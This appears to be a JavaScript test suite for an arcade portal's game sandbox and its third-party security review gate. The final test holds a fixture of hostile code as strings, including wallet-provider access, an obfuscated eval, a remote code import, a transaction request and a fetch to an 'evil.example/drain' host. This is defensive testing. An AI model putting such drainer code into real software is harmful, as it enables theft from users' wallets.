import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import {
  buildCabinetSandboxPolicy,
  buildMockParentHarnessModel,
  validateSandboxedCabinetManifest,
} from '../apps/portal/src/arcade-sandbox.mjs';
import {
  runThirdPartyCabinetSecurityReview,
  THIRD_PARTY_SECURITY_REVIEW_RULES,
} from '../apps/portal/src/arcade-security-review.mjs';

const mockParentHarnessPath = new URL('../apps/portal/dev/mock-parent-harness.html', import.meta.url);

test('HMH dogfoods the sandboxed cabinet manifest path and policy', () => {
  const manifestPath = fileURLToPath(new URL('../apps/portal/games/hard-money-heroes/game.manifest.json', import.meta.url));
  assert.equal(existsSync(manifestPath), true, 'HMH sandbox manifest should exist in /games/hard-money-heroes');
  const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
  const result = validateSandboxedCabinetManifest(manifest);

  assert.equal(result.valid, true, result.errors.join('; '));
  assert.equal(result.manifest.id, 'hard-money-heroes');
  assert.equal(result.manifest.entry, './main.mjs');
  assert.equal(result.manifest.rankedEligible, true);
  assert.deepEqual(result.manifest.sandbox.allow, ['scripts']);
  assert.equal(result.manifest.sandbox.walletAccess, false);
  assert.equal(result.manifest.sandbox.sameOriginAccess, false);

  const policy = buildCabinetSandboxPolicy(result.manifest);
  assert.equal(policy.sandboxAttribute, 'allow-scripts');
  assert.equal(policy.allowAttribute, 'fullscreen');
  assert.equal(policy.csp.connectSrc, "'self'");
  assert.equal(policy.flags.canAccessParentOrigin, false);
  assert.equal(policy.flags.canAccessWalletProvider, false);
});

test('mock-parent harness exposes deterministic third-party validation scenarios', () => {
  const harness = buildMockParentHarnessModel({ manifestId: 'hard-money-heroes' });
  assert.equal(harness.id, 'lesters-arcade-mock-parent-harness-v1');
  assert.equal(harness.manifestId, 'hard-money-heroes');
  assert.deepEqual(harness.scenarios.map((scenario) => scenario.id), [
    'free-session-events',
    'ranked-chain-guard',
    'malformed-message-rejection',
    'rate-limit-flood-drop',
    'wallet-isolation',
  ]);
  assert.ok(harness.instructions.some((line) => line.includes('postMessage')));
  assert.ok(harness.instructions.some((line) => line.includes('arcade.ready')));

  assert.equal(existsSync(fileURLToPath(mockParentHarnessPath)), true, 'browser mock-parent harness should exist');
  const html = readFileSync(fileURLToPath(mockParentHarnessPath), 'utf8');
  assert.equal(html.includes('id="cabinetFrame"'), true);
  assert.equal(html.includes('sandbox="allow-scripts"'), true);
  assert.equal(html.includes('arcade.ready'), true);
  assert.equal(html.includes('rate-limit-flood-drop'), true);
  assert.equal(html.includes('window.ethereum'), false, 'mock parent must not inject a wallet provider into the cabinet');
});

test('third-party cabinet security review gate catches wallet, eval, remote code, sandbox, and undeclared endpoints', () => {
  assert.deepEqual(THIRD_PARTY_SECURITY_REVIEW_RULES.map((rule) => rule.id), [
    'no-wallet-provider-access',
    'no-dynamic-code-execution',
    'no-remote-code-imports',
    'declared-network-endpoints-only',
    'sandbox-least-privilege',
    'no-drainer-patterns',
  ]);

  const clean = runThirdPartyCabinetSecurityReview({
    manifest: {
      id: 'clean-cabinet',
      name: 'Clean Cabinet',
      version: '1.0.0',
      sdkVersion: '1.0.0',
      status: 'playable',
      aspectSupport: ['9:16', '16:9'],
      controlScheme: 'tap',
      capabilities: [],
      rankedEligible: false,
      entry: './main.mjs',
      endpoints: ['https://api.example.com/scores'],
      sandbox: { allow: ['scripts'], walletAccess: false, sameOriginAccess: false },
    },
    files: [
      { path: 'main.mjs', content: "parent.postMessage({ source: 'lesters-arcade-sdk', type: 'arcade.ready' }, '*');" },
      { path: 'net.mjs', content: "fetch('https://api.example.com/scores')" },
    ],
  });
  assert.equal(clean.ok, true, clean.findings.map((finding) => finding.ruleId).join('; '));

  const dynamicCodePrimitive = ['ev', 'al'].join('') + '(userCode)';
  const risky = runThirdPartyCabinetSecurityReview({
    manifest: {
      id: 'risky-cabinet',
      name: 'Risky Cabinet',
      version: '1.0.0',
      sdkVersion: '1.0.0',
      status: 'playable',
      aspectSupport: ['9:16', '16:9'],
      controlScheme: 'tap',
      capabilities: ['ranked', 'leaderboard'],
      rankedEligible: true,
      entry: './main.mjs',
      endpoints: [],
      sandbox: { allow: ['scripts', 'same-origin'], walletAccess: true, sameOriginAccess: true },
    },
    files: [
      { path: 'main.mjs', content: `const provider = window.ethereum; ${dynamicCodePrimitive}; import('https://cdn.bad/game.mjs');` },
      { path: 'wallet.mjs', content: "ethereum.request({ method: 'eth_sendTransaction' }); fetch('https://evil.example/drain'); approve(spender, amount);" },
    ],
  });
  assert.equal(risky.ok, false);
  assert.deepEqual(risky.findings.map((finding) => finding.ruleId), [
    'no-wallet-provider-access',
    'no-dynamic-code-execution',
    'no-remote-code-imports',
    'declared-network-endpoints-only',
    'sandbox-least-privilege',
    'no-drainer-patterns',
  ]);
});
